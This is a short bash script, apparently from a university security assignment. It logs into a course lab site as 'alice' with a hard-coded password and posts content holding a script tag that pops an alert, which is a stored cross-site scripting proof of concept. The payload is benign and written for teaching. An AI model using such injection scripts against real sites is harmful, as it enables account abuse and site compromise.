#!/bin/bash
POST_URL="${1}/post.php"
curl "http://ugster21.student.cs.uwaterloo.ca/reset/z63zhu"
curl -c cookies -d "username=alice&password=Passsw0rd&form=login&submit=Login" ${POST_URL}
curl -b cookies -d "title=4&content=<script>\
function myFunction(){\
	alert('My JavaScript');\
}\
myFunction();</script>\
&type=1&form=content&submit=submit" ${POST_URL}